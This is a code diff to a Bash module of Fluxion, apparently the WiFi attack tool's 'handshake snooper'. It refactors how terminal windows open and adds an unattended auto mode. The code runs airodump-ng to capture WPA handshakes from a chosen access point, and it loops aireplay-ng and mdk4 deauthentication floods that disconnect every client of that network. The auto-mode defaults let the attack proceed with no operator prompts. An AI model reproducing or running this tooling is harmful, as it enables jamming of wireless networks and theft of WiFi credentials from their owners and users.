@@ -50,10 +50,9 @@ handshake_snooper_arbiter_daemon() {
   sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/dump-*"
 
   # Display some feedback to the user to assure verifier is working.
-  xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg "#000000" -fg "#CCCCCC" \
-    -title "Handshake Snooper Arbiter Log" -e \
-    "tail -f \"$FLUXIONWorkspacePath/handshake_snooper.log\"" &
-  local handshake_snooper_arbiter_daemon_viewerPID=$!
+  fluxion_window_open handshake_snooper_arbiter_daemon_viewerPID \
+    "Handshake Snooper Arbiter Log" "$BOTTOMLEFT" "#000000" "#CCCCCC" \
+    "tail -f \"$FLUXIONWorkspacePath/handshake_snooper.log\""
 
   local now=$(env -i date '+%H:%M:%S')
   echo -e "[$now] $HandshakeSnooperStartingArbiterNotice" > \
@@ -160,10 +159,10 @@ handshake_snooper_start_captor() {
     echo "Captor interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
   fi
 
-  xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $FluxionTargetChannel)" \
-    $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
-    airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface &
-  local parentPID=$!
+  local parentPID
+  fluxion_window_open parentPID \
+    "Handshake Captor (CH $FluxionTargetChannel)" "$TOPLEFT" "#000000" "#FFFFFF" \
+    "airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/capture/dump\" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface"
 
   while [ ! "$HandshakeSnooperCaptorPID" ]; do
     sleep 1 &
@@ -210,16 +209,14 @@ handshake_snooper_start_deauthenticator() {
   # Start deauthenticators.
   case "$HandshakeSnooperDeauthenticatorIdentifier" in
     "$HandshakeSnooperAireplayMethodOption")
-      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
-      HandshakeSnooperDeauthenticatorPID=$!
+      fluxion_window_open HandshakeSnooperDeauthenticatorPID \
+        "Deauthenticating all clients on $FluxionTargetSSID" "$BOTTOMRIGHT" "#000000" "#FF0009" \
+        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done"
     ;;
     "$HandshakeSnooperMdk4MethodOption")
-      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
-      HandshakeSnooperDeauthenticatorPID=$!
+      fluxion_window_open HandshakeSnooperDeauthenticatorPID \
+        "Deauthenticating all clients on $FluxionTargetSSID" "$BOTTOMRIGHT" "#000000" "#FF0009" \
+        "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done"
     ;;
   esac
 }
@@ -234,6 +231,11 @@ handshake_snooper_set_deauthenticator_identifier() {
   if [ "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 0; fi
 
   handshake_snooper_unset_deauthenticator_identifier
+
+  if [ "$FLUXIONAuto" ]; then
+    HandshakeSnooperDeauthenticatorIdentifier="$HandshakeSnooperMdk4MethodOption"
+    return 0
+  fi
 
   local methods=(
     "$HandshakeSnooperMonitorMethodOption"
@@ -295,13 +297,9 @@ handshake_snooper_set_jammer_interface() {
 
   echo "Succeeded get jammer interface." > $FLUXIONOutputDevice
   
-  # For mdk4, we need the actual physical interface that supports wireless extensions.
-  local jammerIface=$selectedInterface
-  # If interface is in hash table (renamed), prefer the physical interface for mdk4 compatibility
-  if [ ! -z "${FluxionInterfaces[$selectedInterface]}" ]; then
-    jammerIface=$selectedInterface
-  fi
-  
+  # Use the renamed monitor interface (e.g. fluxwl0), not the original name.
+  local jammerIface=${FluxionInterfaces[$selectedInterface]:-$selectedInterface}
+
   HandshakeSnooperJammerInterface=$jammerIface
 }
 
@@ -314,6 +312,11 @@ handshake_snooper_set_verifier_identifier() {
   if [ "$HandshakeSnooperVerifierIdentifier" ]; then return 0; fi
 
   handshake_snooper_unset_verifier_identifier
+
+  if [ "$FLUXIONAuto" ]; then
+    HandshakeSnooperVerifierIdentifier="cowpatty"
+    return 0
+  fi
 
   local choices=(
     "$FLUXIONHashVerificationMethodAircrackOption"
@@ -354,6 +357,11 @@ handshake_snooper_set_verifier_interval() {
 
   handshake_snooper_unset_verifier_interval
 
+  if [ "$FLUXIONAuto" ]; then
+    HandshakeSnooperVerifierInterval=30
+    return 0
+  fi
+
   local choices=("$HandshakeSnooperVerifierInterval30SOption" "$HandshakeSnooperVerifierInterval60SOption" "$HandshakeSnooperVerifierInterval90SOption" "$FLUXIONGeneralBackOption")
   io_query_choice "$HandshakeSnooperVerifierIntervalQuery" choices[@]
 
@@ -380,6 +388,11 @@ handshake_snooper_set_verifier_synchronicity() {
   if [ "$HandshakeSnooperVerifierSynchronicity" ]; then return 0; fi
 
   handshake_snooper_unset_verifier_synchronicity
+
+  if [ "$FLUXIONAuto" ]; then
+    HandshakeSnooperVerifierSynchronicity="non-blocking"
+    return 0
+  fi
 
   local choices=(
     "$HandshakeSnooperVerifierSynchronicityAsynchronousOption"
